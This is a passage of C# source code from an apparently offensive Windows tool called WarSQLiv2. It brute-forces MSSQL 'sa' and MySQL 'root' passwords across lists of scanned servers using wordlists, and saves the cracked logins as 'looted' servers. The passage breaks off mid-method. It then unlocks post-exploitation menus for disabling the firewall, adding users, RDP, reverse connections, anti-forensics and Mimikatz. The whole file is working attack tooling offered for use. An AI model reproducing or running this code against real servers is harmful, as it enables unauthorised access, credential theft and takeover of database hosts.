using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;
using Microsoft.Win32;
using MySql.Data.MySqlClient;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.UserControls.Attack.MSSQL;

namespace WarSQLiv2.UserControls
{
    /// <summary>
    /// Interaction logic for WarSQLiAttack.xaml
    /// </summary>
    public partial class WarSQLiAttack : Window
    {
        string _serverType = "";
        private string _userFilePath;
        private string _userPassPath;
        private bool _HasStopRequest = false;
        readonly List<string> _foundedPasswordList = new List<string>();
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        public WarSQLiAttack()
        {
            InitializeComponent();
        }
        private void Window_Closing(object sender, CancelEventArgs e)
        {
            Application.Current.Shutdown();
        }
        private void btnStart_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (rdPassFast.IsChecked == true)
                {
                    var fastPasswordCheck = Task.Factory.StartNew(FastPasswordScan);
                }
                else if (rdPassExtended.IsChecked == true)
                {
                    var extendedPasswordCheck = Task.Factory.StartNew(ExtendedPasswordScan);
                }
                else if (rdStaticUser.IsChecked == true)
                {
                    if (string.IsNullOrEmpty(_userPassPath))
                    {
                        OpenPassList();
                    }
                    else
                    {
                        var staticUserCheck = Task.Factory.StartNew(StaticUserScan);
                    }
                }
                else if (rdStaticPass.IsChecked == true)
                {
                    if (string.IsNullOrEmpty(_userFilePath))
                    {
                        OpenUserList();
                    }
                    else
                    {
                        var staticPassCheck = Task.Factory.StartNew(StaticPassScan);
                    }
                }
                else
                {
                    if (string.IsNullOrEmpty(_userFilePath) && string.IsNullOrEmpty(_userPassPath))
                    {
                        OpenUserList();
                        OpenPassList();
                    }
                    else
                    {
                        var staticPassCheck = Task.Factory.StartNew(UserAndPasswordListScan);
                    }
                }
            }
            catch (Exception exp)
            {
                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
            }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    rdPassFast.IsChecked = true;
                    btnFilePass.IsEnabled = false;
                    btnFileUser.IsEnabled = false;
                    var fileName = Directory.GetCurrentDirectory() + @"\Scanner\FoundServer\SqlServerList.txt";
                    var foundSqlServerList = File.ReadLines(fileName);
                    var sqlServerList = foundSqlServerList as string[] ?? foundSqlServerList.ToArray();
                    for (var i = 0; i < sqlServerList.Count(); i++)
                    {
                        lstFoundedAddress.Items.Add(sqlServerList[i]);
                    }
                    Task.Factory.StartNew(SelectedLang);
                    Task.WaitAll();
                    var passFileControl = new PassFileControl();
                    Task.Factory.StartNew(() => passFileControl.ExtendedPasswordFileControl());
                    Task.Factory.StartNew(() => passFileControl.FastPasswordFileControl());
                });
                
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
                
            }
        }
        private void ExploitMenuControl()
        {
            Dispatcher.Invoke(new Action(() =>
            {
                if (lstResult.Items.Count > 0)
                {
                    //btnSaveReport.Enabled = true;
                    if (_foundedPasswordList.Count > 0)
                    {
                        foreach (var split in _foundedPasswordList.Select(t => t.Split(':')))
                        {
                            switch (split[1])
                            {
                                case "1433":
                                    menuExploitMsSqlSQLUserAdd.IsEnabled = true;
                                    menuExploitMSSQLDisableWindowsFirewall.IsEnabled = true;
                                    menuExploitMsSqlLocalUserAdd.IsEnabled = true;
                                    menuExploitMSSQLWindowsUserList.IsEnabled = true;
                                    menuExploitMsSqlDirectoryList.IsEnabled = true;
                                    menuExploitMsSqlRDP.IsEnabled = true;
                                    menuExploitMsSqlReverseConnection.IsEnabled = true;
                                    menuExploitMsSqlAntiForensics.IsEnabled = true;
                                    menuExploitMsSqlAllPrograms.IsEnabled = true;
                                    menuExploitMsSqlTaskManager.IsEnabled = true;
                                    menuExploitMsSqlServiceManager.IsEnabled = true;
                                    menuExploitMsSqlSystemInfo.IsEnabled = true;
                                    menuExploitMsSqlEnum.IsEnabled = true;
                                    menuExploitMsSqlPowershell.IsEnabled = true;
                                    menuExploitMsSqlEnumerate.IsEnabled = true;
                                    menuExploitMsSqlHacking.IsEnabled = true;
                                    menuExploitMsSqlPostExploitation.IsEnabled = true;
                                    menuExploitMsSqlPrivEsc.IsEnabled = true;
                                    menuExploitMsSqlForensics.IsEnabled = true;
                                    menuExploitMsSqlPrivilegeEscalation.IsEnabled = true;
                                    menuExploitMsSqlFileUpload.IsEnabled = true;
                                    menuExploitMsSqlMimikatz.IsEnabled = true;

                                    break;
                            }
                        }
                    }
                }
            }));
        }
        private void SelectedLang()
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                _languageControl.FindLang();
                                _languageControl.SelectedLanguage = new ResourceManager("WarSQLiv2.Language." + _languageControl.LoadedLang,
                                                Assembly.GetExecutingAssembly());
                                menuFile.Header = _languageControl.SelectedLanguage.GetString("MenuFile");
                                menuFileNewSession.Header = _languageControl.SelectedLanguage.GetString("MenuFileNew");
                                menuFileRestart.Header = _languageControl.SelectedLanguage.GetString("MenuFileRestart");
                                menuFileExit.Header = _languageControl.SelectedLanguage.GetString("MenuFileClose");
                                menuLanguage.Header = _languageControl.SelectedLanguage.GetString("MenuLanguage");
                                menuLanguageEnglish.Header = _languageControl.SelectedLanguage.GetString("MenuLanguageEnglish");
                                menuLanguageTurkish.Header = _languageControl.SelectedLanguage.GetString("MenuLanguageTurkish");
                                menuExploitMSSQLDisableWindowsFirewall.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlFirewall");
                                menuExploitMSSQLWindowsUserList.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlShowWinUser");
                                menuExploitMsSqlAllPrograms.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlProgramList");
                                menuExploitMsSqlAntiForensics.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlAntiForensics");
                                menuExploitMsSqlDirectoryList.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlDirectoryManager");
                                menuExploitMsSqlLocalUserAdd.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlWinUser");
                                menuExploitMsSqlRDP.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlRemote");
                                menuExploitMsSqlReverseConnection.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlReverse");
                                menuExploitMsSqlSQLUserAdd.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlAddMsSqlUser");
                                menuExploitMsSqlServiceManager.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlService");
                                menuExploitMsSqlSystemInfo.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlInfo");
                                menuExploitMsSqlTaskManager.Header = _languageControl.SelectedLanguage.GetString("MenuExploitMssqlTask");
                                menuAbout.Header = _languageControl.SelectedLanguage.GetString("MenuAbout");
                                menuAboutAbout.Header = _languageControl.SelectedLanguage.GetString("MenuAbout");
                                menuExploitMsSqlEnumerate.Header = _languageControl.SelectedLanguage.GetString("menuExploitMsSqlEnumerate");
                                menuExploitMsSqlHacking.Header = _languageControl.SelectedLanguage.GetString("menuExploitMsSqlHacking");
                                menuExploitMsSqlPostExploitation.Header = _languageControl.SelectedLanguage.GetString("menuExploitMsSqlPostExploitation");
                                menuExploitMsSqlPrivEsc.Header = _languageControl.SelectedLanguage.GetString("menuExploitMsSqlPrivEsc");
                                menuExploitMsSqlForensics.Header = _languageControl.SelectedLanguage.GetString("menuExploitMsSqlForensics");
                                menuExploitMsSqlFileUpload.Header = _languageControl.SelectedLanguage.GetString("menuExploitMsSqlFileUpload");
                                btnStart.Content = _languageControl.SelectedLanguage.GetString("ButtonStart");
                                btnStop.Content = _languageControl.SelectedLanguage.GetString("ButtonStop");
                                btnFilePass.Content = _languageControl.SelectedLanguage.GetString("ButtonSelectFile");
                                btnFileUser.Content = _languageControl.SelectedLanguage.GetString("ButtonSelectFile");
                                lblTestedPass.Content = _languageControl.SelectedLanguage.GetString("LabelTestedPass");
                                lblUserName.Content = _languageControl.SelectedLanguage.GetString("LabelUserName");
                                lblPassword.Content = _languageControl.SelectedLanguage.GetString("LabelPassword");
                                lblUserList.Content = _languageControl.SelectedLanguage.GetString("FileSelectUser2");
                                rdPassFast.Content = _languageControl.SelectedLanguage.GetString("RadioFast");
                                rdPassExtended.Content = _languageControl.SelectedLanguage.GetString("RadioExtended");
                                rdStaticPass.Content = _languageControl.SelectedLanguage.GetString("RadioStaticPass");
                                rdStaticUser.Content = _languageControl.SelectedLanguage.GetString("RadioStaticUser");
                                rdUserPassList.Content = _languageControl.SelectedLanguage.GetString("RadioUserAndPass");
                                lblFoundedPass.Content = _languageControl.SelectedLanguage.GetString("LabelFoundedPassword");
                            });
            }
            catch (Exception exp)
            {
                txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
            }
        }
        private void OpenUserList()
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                var selectDialog = new OpenFileDialog
                                {
                                    Title = _languageControl.SelectedLanguage.GetString("FileSelectUser1"),
                                    Filter = @"(*.txt)|*.txt",
                                    Multiselect = false,
                                    FileName = _languageControl.SelectedLanguage.GetString("FileSelectUser2")
                                };
                                selectDialog.ShowDialog();
                                foreach (var str in selectDialog.FileNames)
                                {
                                    lblSelectedUserList.Content = str;
                                    _userFilePath = lblSelectedUserList.Content.ToString();
                                }
                                if ((string)lblSelectedUserList.Content == _languageControl.SelectedLanguage.GetString("FileSelectUser1"))
                                {
                                    lblSelectedUserList.Content = "";
                                    _userFilePath = lblSelectedUserList.Content.ToString();
                                }
                            });
            }
            catch (Exception exp)
            {
                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
            }
        }
        private void OpenPassList()
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                var selectDialog = new OpenFileDialog
                                {
                                    Title = _languageControl.SelectedLanguage.GetString("FileSelectPass1"),
                                    Filter = @"(*.txt)|*.txt",
                                    Multiselect = false,
                                    InitialDirectory = @"Scanner\Wordlists\",
                                    FileName = _languageControl.SelectedLanguage.GetString("FileSelectPass2")
                                };
                                selectDialog.ShowDialog();
                                foreach (var str in selectDialog.FileNames)
                                {
                                    lblSelectedPassList.Content = str;
                                    _userPassPath = lblSelectedPassList.Content.ToString();
                                }
                                if ((string) lblSelectedPassList.Content == _languageControl.SelectedLanguage.GetString("FileSelectPass2"))
                                {
                                    lblSelectedPassList.Content = "";
                                    _userPassPath = lblSelectedPassList.Content.ToString();
                                }
                            });
            }
            catch (Exception exp)
            {
                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
            }
        }
        private void FastPasswordScan()
        {
            try
            {
                var fastPasswordList = new List<string>();
                var fileName = Directory.GetCurrentDirectory() + @"\Scanner\Wordlists\Fast.txt";
                var fastPassText = File.ReadLines(fileName);
                var fastPasswordText = fastPassText as string[] ?? fastPassText.ToArray();
                var passCount = fastPasswordText.Count();
                for (var i = 0; i < passCount; i++)
                {
                    fastPasswordList.Add(fastPasswordText[i]);
                }
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    progBar.Minimum = 0;
                    progBar.Maximum = lstFoundedAddress.Items.Count;
                    progBarPass.Value = 0;
                    progBarPass.Maximum = fastPasswordList.Count;
                });
                for (var f = 0; f < lstFoundedAddress.Items.Count; f++)
                {
                    var split = lstFoundedAddress.Items[f].ToString().Split(':');
                    Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                try
                                {
                                    txtStatus.AppendText(string.Format("{0}{1} {3}{0}{4}{2} {5}", Environment.NewLine, lstFoundedAddress.Items[f], DateTime.Now, _languageControl.SelectedLanguage.GetString("AttackStart1"), _languageControl.SelectedLanguage.GetString("AttackStart2"), _languageControl.SelectedLanguage.GetString("AttackStart3")));
                                }
                                catch (Exception exp)
                                {
                                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                                }
                            });
                    _serverType = lstFoundedAddress.Items[f].ToString();

                    var msSqlBool1 = _serverType.Contains("1433");
                    var mySqlBool1 = _serverType.Contains("3306");

                    //Microsoft SQL
                    #region
                    if (msSqlBool1)
                    {
                        for (var r = 0; r < fastPasswordList.Count; r++)
                        {
                            if(_HasStopRequest == true)
                            {
                                _HasStopRequest = false;
                                break;                                
                            }
                            else
                            {
                                try
                                {
                                    var connStr =
                                        $"Data Source={split[0]};uid=sa;pwd={fastPasswordList[r]};pooling=true;connection lifetime=10;";
                                    var conn = new SqlConnection(connStr);
                                    conn.Open();
                                    if (conn.State == ConnectionState.Open)
                                    {

                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}:{fastPasswordList[r]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                            progBarPass.Value = fastPasswordList.Count;
                                        });
                                        Dispatcher.Invoke(new Action(() => {
                                            lstResult.Items.Add(lstFoundedAddress.Items[f] + ":sa:" + fastPasswordList[r]);
                                            _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":sa:" + fastPasswordList[r]);
                                        }));
                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = r;
                                    });
                                    conn.Close();
                                    break;
                                }
                                catch (SqlException)
                                {

                                }
                            }
                            
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBarPass.Value = r;
                            });
                        }
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                        });
                    }
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        progBar.Value = lstFoundedAddress.Items.Count;
                    });

                    #endregion
                    //Oracle - Mysql
                    #region
                    if (mySqlBool1)
                    {
                        try
                        {
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MySqlAttack1")}");
                            });
                            for (var q = 0; q < fastPasswordList.Count; q++)
                            {
                                if (_HasStopRequest == true)
                                {
                                    _HasStopRequest = false;
                                    break;
                                }
                                try
                                {
                                    var con = new MySqlConnectionStringBuilder() { Server = split[0], UserID = "root", Password = fastPasswordList[q] };
                                    var baglanti = new MySqlConnection(con.ToString());
                                    baglanti.Open();
                                    if (baglanti.State == ConnectionState.Open)
                                    {
                                        Dispatcher.Invoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}{fastPasswordList[q]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                            progBarPass.Value = fastPasswordList.Count;
                                            progBar.Value = f;
                                        });
                                        Dispatcher.Invoke(new Action(() => {
                                            lstResult.Items.Add(lstFoundedAddress.Items[f] + ":root:" + fastPasswordList[q]);
                                            _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":root:" + fastPasswordList[q]);
                                        }));

                                        baglanti.Close();
                                        break;
                                    }
                                }
                                catch (MySqlException exp)
                                {
                                    var err = exp.Number;
                                    if (err == 1130)
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError2")}");
                                        });
                                        break;
                                    }
                                    else if (err == 2003)
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError1")}");
                                        });
                                        break;
                                    }
                                    else
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            progBarPass.Value = q;
                                        });
                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = q;
                                    });
                                }
                                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                {
                                    progBar.Value = f;
                                });
                            }
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBar.Value = lstFoundedAddress.Items.Count;
                            });
                        }
                        catch (Exception exp)
                        {
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                            });
                        }
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                            progBar.Value = f;
                        });
                    }
                    #endregion
                    
                }
                Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                progBar.Value = lstFoundedAddress.Items.Count;
                            });
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("AttackFinish1")} {DateTime.Now.ToLongDateString()} {_languageControl.SelectedLanguage.GetString("AttackFinish2")} {DateTime.Now.ToLongTimeString()} {_languageControl.SelectedLanguage.GetString("AttackFinish3")}");
                });
                try
                {
                    Task.Factory.StartNew(ExploitMenuControl);
                    var savePasswordFile = new SaveLootedServer { LootedPasswordList = new List<string>() };
                    for (var i = 0; i < _foundedPasswordList.Count; i++)
                    {
                        savePasswordFile.LootedPasswordList.Add(_foundedPasswordList[i]);
                    }
                    Task.Factory.StartNew(savePasswordFile.SaveLootedSqlServer);
                }
                catch (Exception exp)
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                }                
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }

        }
        private void ExtendedPasswordScan()
        {
            try
            {
                var fastPasswordList = new List<string>();
                const string fileName = @"Scanner\Wordlists\Extended.txt";
                var fastPassText = File.ReadLines(fileName);
                var fastPasswordText = fastPassText as string[] ?? fastPassText.ToArray();
                var passCount = fastPasswordText.Count();
                for (var i = 0; i < passCount; i++)
                {
                    fastPasswordList.Add(fastPasswordText[i]);
                }
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    progBar.Minimum = 0;
                    progBar.Maximum = lstFoundedAddress.Items.Count;
                    progBarPass.Value = 0;
                    progBarPass.Maximum = fastPasswordList.Count;
                });

                for (var f = 0; f < lstFoundedAddress.Items.Count; f++)
                {
                    var split = lstFoundedAddress.Items[f].ToString().Split(':');
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                try
                                {
                                    txtStatus.AppendText(string.Format("{0}{1} {3}{0}{4}{2} {5}", Environment.NewLine, lstFoundedAddress.Items[f], DateTime.Now, _languageControl.SelectedLanguage.GetString("AttackStart1"), _languageControl.SelectedLanguage.GetString("AttackStart2"), _languageControl.SelectedLanguage.GetString("AttackStart3")));
                                }
                                catch (Exception exp)
                                {
                                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                                }
                                
                            });

                    _serverType = lstFoundedAddress.Items[f].ToString();

                    var msSqlBool1 = _serverType.Contains("1433");
                    var mySqlBool1 = _serverType.Contains("3306");

                    //Microsoft SQL
                    #region
                    if (msSqlBool1)
                    {
                        for (var r = 0; r < fastPasswordList.Count; r++)
                        {
                            if (_HasStopRequest == true)
                            {
                                _HasStopRequest = false;
                                break;
                            }
                            else
                            {
                                try
                                {
                                    var connStr =
                                        $"Data Source={split[0]};uid=sa;pwd={fastPasswordList[r]};pooling=true;connection lifetime=10;";
                                    var conn = new SqlConnection(connStr);
                                    conn.Open();
                                    if (conn.State == ConnectionState.Open)
                                    {

                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}:{fastPasswordList[r]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                            progBarPass.Value = fastPasswordList.Count;
                                        });
                                        Dispatcher.Invoke(new Action(() => {
                                            lstResult.Items.Add(lstFoundedAddress.Items[f] + ":sa:" + fastPasswordList[r]);
                                            _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":sa:" + fastPasswordList[r]);
                                        }));

                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = r;
                                    });

                                    conn.Close();
                                    break;
                                }
                                catch (SqlException)
                                {

                                }
                            }
                            
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBarPass.Value = r;
                            });
                        }
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                        });

                    }
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        progBar.Value = lstFoundedAddress.Items.Count;
                    });


                    #endregion
                    //Oracle - Mysql
                    #region
                    if (mySqlBool1)
                    {
                        try
                        {
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MySqlAttack1")}");
                            });
                            for (var q = 0; q < fastPasswordList.Count; q++)
                            {
                                if (_HasStopRequest == true)
                                {
                                    _HasStopRequest = false;
                                    break;
                                }
                                try
                                {
                                    var con = new MySqlConnectionStringBuilder() { Server = split[0], UserID = "root", Password = fastPasswordList[q] };
                                    var baglanti = new MySqlConnection(con.ToString());
                                    baglanti.Open();
                                    if (baglanti.State == ConnectionState.Open)
                                    {
                                        Dispatcher.Invoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}{fastPasswordList[q]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                            progBarPass.Value = fastPasswordList.Count;
                                            progBar.Value = f;
                                        });
                                        Dispatcher.Invoke(new Action(() => {
                                            lstResult.Items.Add(lstFoundedAddress.Items[f] + ":root:" + fastPasswordList[q]);
                                            _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":root:" + fastPasswordList[q]);
                                        }));

                                        baglanti.Close();
                                        break;
                                    }
                                }
                                catch (MySqlException exp)
                                {
                                    var err = exp.Number;
                                    if (err == 1130)
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError2")}");
                                        });
                                        break;
                                    }
                                    else if (err == 2003)
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError1")}");
                                        });
                                        break;
                                    }
                                    else
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            progBarPass.Value = q;
                                        });
                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = q;
                                    });
                                }
                                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                {
                                    progBar.Value = f;
                                });
                            }
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBar.Value = lstFoundedAddress.Items.Count;
                            });
                        }
                        catch (Exception exp)
                        {
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                            });
                        }
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                            progBar.Value = f;
                        });
                    }
                    #endregion
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBar.Value = f;
                            });

                }
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBar.Value = lstFoundedAddress.Items.Count;
                            });
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("AttackFinish1")} {DateTime.Now.ToLongDateString()} {_languageControl.SelectedLanguage.GetString("AttackFinish2")} {DateTime.Now.ToLongTimeString()} {_languageControl.SelectedLanguage.GetString("AttackFinish3")}");
                });
                try
                {
                    Task.Factory.StartNew(ExploitMenuControl);
                    var savePasswordFile = new SaveLootedServer { LootedPasswordList = new List<string>() };
                    for (var i = 0; i < _foundedPasswordList.Count; i++)
                    {
                        savePasswordFile.LootedPasswordList.Add(_foundedPasswordList[i]);
                    }
                    Task.Factory.StartNew(savePasswordFile.SaveLootedSqlServer);
                    Task.Factory.StartNew(savePasswordFile.SaveLootedSqlServer);
                }
                catch (Exception exp)
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                }                
            }
            catch (Exception exp)
            {
                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
            }
        }
        private void StaticUserScan()
        {
            try
            {
                var fastPasswordList = new List<string>();
                var fileName = _userPassPath;
                var fastPassText = File.ReadLines(fileName);
                var fastPasswordText = fastPassText as string[] ?? fastPassText.ToArray();
                var passCount = fastPasswordText.Count();
                for (var i = 0; i < passCount; i++)
                {
                    fastPasswordList.Add(fastPasswordText[i]);
                }
                var UserName = string.Empty;
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    progBar.Minimum = 0;
                    progBar.Maximum = lstFoundedAddress.Items.Count;
                    progBarPass.Value = 0;
                    progBarPass.Maximum = fastPasswordList.Count;
                    UserName = txtUserName.Text;
                });

                for (var f = 0; f < lstFoundedAddress.Items.Count; f++)
                {
                    var split = lstFoundedAddress.Items[f].ToString().Split(':');
                    Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                try
                                {
                                    txtStatus.AppendText(string.Format("{0}{1} {3}{0}{4}{2} {5}", Environment.NewLine, lstFoundedAddress.Items[f], DateTime.Now, _languageControl.SelectedLanguage.GetString("AttackStart1"), _languageControl.SelectedLanguage.GetString("AttackStart2"), _languageControl.SelectedLanguage.GetString("AttackStart3")));
                                }
                                catch (Exception exp)
                                {
                                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                                }
                            });

                    _serverType = lstFoundedAddress.Items[f].ToString();

                    var msSqlBool1 = _serverType.Contains("1433");
                    var mySqlBool1 = _serverType.Contains("3306");

                    //Microsoft SQL
                    #region
                    if (msSqlBool1)
                    {
                        for (var r = 0; r < fastPasswordList.Count; r++)
                        {
                            if (_HasStopRequest == true)
                            {
                                _HasStopRequest = false;
                                break;
                            }
                            else
                            {
                                try
                                {
